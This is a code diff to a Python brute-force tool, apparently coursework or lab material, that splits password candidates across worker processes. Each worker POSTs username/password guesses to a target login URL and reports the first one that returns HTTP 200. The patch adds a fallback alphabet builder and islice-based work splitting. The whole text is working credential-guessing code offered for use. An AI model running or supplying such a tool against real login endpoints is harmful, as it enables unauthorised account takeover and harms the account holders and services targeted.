@@ -19,6 +19,7 @@ import sys
 import time
 import string
 import requests
+from itertools import islice
 from pathlib import Path
 from mono_attack import build_alphabet as build_mono_alphabet
 from poly_attack import build_alphabet as build_poly_alphabet
@@ -63,14 +64,34 @@ def worker_process(worker_id, num_workers, target_url, username, mode, args_dict
         max_len = args_dict["max_len"]
         candidates = generate_candidates_mono(alphabet, max_len)
     elif mode == "poly":
-        alphabet = build_poly_alphabet(
-            args_dict.get("digits", False),
-            args_dict.get("lower", False),
-            args_dict.get("upper", False),
-            args_dict.get("symbols", False),
-        )
+        # try external helper first (some versions accept different signatures)
+        try:
+            # preferred: if build_poly_alphabet expects four booleans
+            alphabet = build_poly_alphabet(
+                args_dict.get("digits", False),
+                args_dict.get("lower", False),
+                args_dict.get("upper", False),
+                args_dict.get("symbols", False),
+            )
+        except TypeError:
+            # fallback: build alphabet locally from flags (works reliably)
+            parts = []
+            if args_dict.get("digits", False):
+                parts.append(string.digits)
+            if args_dict.get("lower", False):
+                parts.append(string.ascii_lowercase)
+            if args_dict.get("upper", False):
+                parts.append(string.ascii_uppercase)
+            if args_dict.get("symbols", False):
+                parts.append("!@#$%^&*()_+-=[]{}|;:',.<>?/")
+            if not parts:
+                print(f"[Worker {worker_id}] Poly mode requires at least one of --digits/--lower/--upper/--symbols", file=sys.stderr)
+                return
+            alphabet = "".join(parts)
+
         max_len = args_dict["max_len"]
         candidates = generate_candidates_poly(alphabet, max_len)
+
     elif mode == "dict":
         wordlist = load_wordlist(args_dict["wordlist_path"])
         candidates = generate_candidates_dict(wordlist)
@@ -79,19 +100,16 @@ def worker_process(worker_id, num_workers, target_url, username, mode, args_dict
         return
 
     attempts = 0
-    for idx, candidate in enumerate(candidates):
-        # Check if another worker found the password
+    assigned_iter = islice(candidates, worker_id, None, num_workers)
+    for candidate in assigned_iter:
         if found_event.is_set():
             print(f"[Worker {worker_id}] Stopping (password found by another worker)")
             return
-        
-        # Only test candidates assigned to this worker
-        if idx % num_workers != worker_id:
-            continue
-        
+
         payload = {"username": username, "password": candidate}
         r = try_post(target_url, payload)
         attempts += 1
+
         
         if r and r.status_code == 200:
             # Found it!
@@ -100,7 +118,7 @@ def worker_process(worker_id, num_workers, target_url, username, mode, args_dict
             print(f"[Worker {worker_id}] FOUND: {candidate} (after {attempts} attempts)")
             return
         
-        # Optional: progress reporting
+        # progress reporting
         if attempts % 500 == 0:
             print(f"[Worker {worker_id}] Tested {attempts} candidates, last='{candidate}'")
     
